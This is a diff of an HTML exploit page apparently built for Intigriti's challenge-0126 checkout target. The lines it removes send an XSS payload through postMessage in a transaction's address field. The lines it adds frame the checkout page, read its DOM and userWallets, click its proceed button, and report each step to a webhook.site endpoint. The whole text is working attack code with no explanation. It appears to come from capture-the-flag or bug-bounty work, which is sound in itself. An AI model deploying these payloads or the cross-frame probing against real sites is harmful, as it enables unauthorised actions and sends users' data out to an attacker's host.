@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html><head><title>Address XSS</title></head>
+<html><head><title>Debug Click</title></head>
 <body>
 <h2>Loading...</h2>
 <script>
-const WEBHOOK = 'https://webhook.site/53fbb230-340b-4eba-8cf3-27641c0a00a6';
+const WEBHOOK = 'https://webhook.site/704dafc7-d9e0-4ad2-816b-ad2146a36ad6';
 const WALLET = '16472226db03703a192aa383237035a69f';
 
 fetch(WEBHOOK + '?s=1_START').catch(()=>{});
@@ -14,29 +14,69 @@ if (blank) {
     blank.document.write(`
         <!DOCTYPE html>
         <body>
-        <iframe id="x" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1"></iframe>
+        <h3>Debug</h3>
+        <div id=log></div>
+        <iframe id="checkout" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" style="width:100%;height:400px"></iframe>
         <script>
             const WEBHOOK = '${WEBHOOK}';
             const WALLET = '${WALLET}';
             
-            document.getElementById('x').onload = function() {
-                fetch(WEBHOOK + '?s=2_LOADED').catch(()=>{});
+            function log(msg) {
+                const div = document.getElementById('log');
+                div.innerHTML = msg + '<br>' + div.innerHTML;
+                fetch(WEBHOOK + '?s=' + msg).catch(()=>{});
+            }
+            
+            log('2_READY');
+            
+            document.getElementById('checkout').onload = function() {
+                log('3_LOADED');
                 
                 setTimeout(function() {
-                    // Send with XSS in address field (like the successful exploit)
-                    const iframe = document.getElementById('x');
-                    iframe.contentWindow.postMessage({
-                        type: 'submitTransaction',
-                        transaction: {
-                            toAddress: '<img src=x onerror="alert(\\'gigawatz\\')">',
-                            currency: '1337COIN',
-                            amount: 0,
-                            nickname: 'xss-payload'
+                    try {
+                        const checkoutWin = document.getElementById('checkout').contentWindow;
+                        const doc = checkoutWin.document;
+                        
+                        // Check what elements exist
+                        const elements = {
+                            proceedBtn: !!doc.getElementById('proceedBtn'),
+                            paymentIframe: !!doc.getElementById('paymentIframe'),
+                            paymentPlaceholder: !!doc.getElementById('paymentPlaceholder'),
+                            amountInput: !!doc.getElementById('amountInput')
+                        };
+                        
+                        log('4_ELEMENTS_' + JSON.stringify(elements).replace(/"/g, ''));
+                        
+                        // Try to get userWallets
+                        try {
+                            const wallets = checkoutWin.userWallets;
+                            log('5_WALLETS_' + JSON.stringify(wallets || []).length);
+                        } catch(e) {
+                            log('5_WALLETS_ERROR');
                         }
-                    }, '*');
-                    
-                    fetch(WEBHOOK + '?s=3_SENT').catch(()=>{});
-                }, 2000);
+                        
+                        // Try clicking button
+                        const btn = doc.getElementById('proceedBtn');
+                        if (btn) {
+                            log('6_CLICKING_BUTTON');
+                            btn.click();
+                            
+                            setTimeout(function() {
+                                log('7_AFTER_CLICK');
+                                
+                                const paymentIframe = doc.getElementById('paymentIframe');
+                                if (paymentIframe) {
+                                    log('8_PAYMENT_IFRAME_EXISTS');
+                                } else {
+                                    log('8_NO_PAYMENT_IFRAME');
+                                }
+                            }, 1500);
+                        }
+                        
+                    } catch(e) {
+                        log('4_ERROR_' + e.message);
+                    }
+                }, 1500);
             };
         <\/script>
         </body>
